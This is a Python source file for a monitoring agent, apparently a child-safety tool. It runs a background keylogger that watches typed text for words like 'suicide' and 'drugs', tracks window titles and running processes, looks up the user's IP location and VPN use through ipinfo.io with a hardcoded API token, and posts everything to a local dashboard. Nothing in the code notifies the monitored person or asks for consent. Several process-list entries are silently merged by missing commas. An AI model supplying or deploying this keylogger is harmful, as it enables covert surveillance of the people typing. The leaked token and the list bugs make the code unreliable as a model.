import psutil
import requests
from datetime import datetime
from pynput import keyboard
from collections import defaultdict
import time
import threading
import re
 
KEYWORDS = ["bully", "hate", "suicide", "kill", "drugs"]  
IGNORE_PROCESSES = {
    "System Idle Process",
    "System",
    "Registry",
    "MemCompression",
    "smss.exe",
    "csrss.exe",
    "wininit.exe",
    "winlogon.exe",
    "lsass.exe",
    "svchost.exe",
    "dwm.exe",
    "fontdrvhost.exe",
    "LsaIso.exe",
    "SearchHost.exe",
    "SDXHelper.exe"
    "updater.exe",
    "IdleScheduleEventAction.exe",
    "sppsvc.exe",
    "MoUsoCoreWorker.exe",
    "SDXHelper.exe",
    "smartscreen.exe",
    "SearchHost.exe",
    "atieclxx.exe",       
    "atiesrxx.exe",      
    "RtkAudUService64.exe",  
    "QcomWlanSrvx64.exe",    
    "WTabletServiceISD.exe", 
    "DAX3API.exe",          
    
    "AdobeUpdateService.exe",
    "LenovoVantageService.exe",
    "LenovoUtilityService.exe",
    "SecurityHealthService.exe",
    "gamingservices.exe",    
    "gamingservicesnet.exe",
    "OfficeClickToRun.exe",  
    "MpDefenderCoreService.exe",
    "MsMpEng.exe",          
    "NisSrv.exe",          
    
    "dllhost.exe",
    "conhost.exe",
    "backgroundTaskHost.exe",
    "RuntimeBroker.exe",
    "sihost.exe",
    "ctfmon.exe",
    "dasHost.exe",
    "unsecapp.exe",
    
    "spoolsv.exe",
    "HPPrintScanDoctorService.exe",
    

    "postgres.exe",     
    "pg_ctl.exe",
    
    "vmnat.exe",
    "vmnetdhcp.exe",
    "vmware-authd.exe",
    "vmware-usbarbitrator64.exe",
    
    "python.exe",
    "psql.exe",
    "cmd.exe",
    "powershell.exe",
    "SDXHelper.exe",
    "updater.exe",
    "MoUsoCoreWorker.exe",
    "sppsvc.exe",
    "IdleScheduleEventAction.exe",
    "SearchHost.exe",
    "smartscreen.exe"
    
    "PowerToys.*" 
}
    
class KeyLogger:
    def __init__(self):
        self.current_input = ""
        self.listener = None
 
    def on_press(self, key):
        try:
            char = key.char.lower()  
            self.current_input += char
        except AttributeError:
            return  
 
        for keyword in KEYWORDS:
            if keyword in self.current_input:
                print(f"🔥 Keyword detected: {keyword}") 
                self.current_input = ""
                send_to_dashboard(
                    "keyword_alert",
                    {"keyword": keyword, "context": "Potential risk detected"}
                )
                break
 
    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
 
FLASK_SERVER = "http://127.0.0.1:5000"
REPORT_INTERVAL = 30
 
app_usage = defaultdict(float) 
last_check = time.time()
last_report = time.time()
 
def get_foreground_app():
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        app_name = win32gui.GetWindowText(window)
        return app_name if app_name else "unknown"
    except Exception as e:
        print(f"Error getting foreground app: {e}")
        return "unknown"
 
def get_active_applications():
    current_processes = set()
    for proc in psutil.process_iter(['pid', 'name', 'status']):
        try:
            if proc.info['status'] == psutil.STATUS_RUNNING:
                process_name = proc.info['name']
                if process_name not in IGNORE_PROCESSES:
                    current_processes.add(process_name)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return current_processes
 
previous_processes = set()
 
def send_to_dashboard(activity_type, data):
    """Send data to Flask server"""
    try:
        endpoint = "track-activity"  
        if activity_type == "keyword_alert":
            endpoint = "track-keyword"  
 
        requests.post(
            f"{FLASK_SERVER}/api/{endpoint}",
            json={
                "type": activity_type,
                "data": data,
                "timestamp": datetime.now().isoformat()
            }
        )
    except requests.exceptions.RequestException as e:
        print(f"Failed to send data: {e}")

def get_ip_info(api_key):
    try:
        response = requests.get(f"https://ipinfo.io/json?token={api_key}", timeout=5)
        response.raise_for_status()  
        data = response.json()
        return {
            "ip_address": data.get("ip", "Unknown"),
            "country": data.get("country", "Unknown"),
            "city": data.get("city", "Unknown"),
            "is_vpn": any(kw in data.get("org", "").lower() 
                        for kw in {"vpn", "proxy", "hosting", "server", "cloud"})
        }
    except Exception as e:
        print(f"🔥 IP API Error: {e}")
        return None
 
if __name__ == "__main__":
    key_logger = KeyLogger()
    key_logger_thread = threading.Thread(target=key_logger.start)
    key_logger_thread.daemon = True  
    key_logger_thread.start()
    IP_CHECK_INTERVAL = 60  
    last_ip_check = 0
 
    while True:
        current_time = time.time()
        elapsed = current_time - last_check
        last_check = current_time
 
        current_app = get_foreground_app()
        app_usage[current_app] += elapsed 
        print(f"Tracking: {current_app} | Time: {elapsed} sec")
 
        if current_time - last_report >= 240:
            try:
                requests.post(
                    f"{FLASK_SERVER}/api/track-screen-time",
                    json={
                        "app_usage": dict(app_usage),
                        "timestamp": datetime.now().isoformat()
                    }
                )
            except requests.exceptions.RequestException as e:
                print(f"Failed to send screen time data: {e}")
            app_usage.clear()
            last_report = current_time
 
        current_processes = get_active_applications()
        new_processes = current_processes - previous_processes
 
        if new_processes:
            send_to_dashboard("application_usage", {"applications": list(new_processes)})
            previous_processes = current_processes 
 
        if current_time - last_ip_check >= IP_CHECK_INTERVAL:
            ip_info = get_ip_info("081f5e08d8b8b9")  
            if ip_info:
                print("📤 Sending IP Data:", ip_info)
                try:
                    requests.post(
                        f"{FLASK_SERVER}/api/track-ip",
                        json={
                            "ip_address": ip_info["ip_address"],
                            "country": ip_info["country"],
                            "city": ip_info["city"],
                            "is_vpn": ip_info["is_vpn"]
                        }
                    )
                except Exception as e:
                    print(f"Failed to send IP data: {e}")
            last_ip_check = current_time
    
        time.sleep(REPORT_INTERVAL)
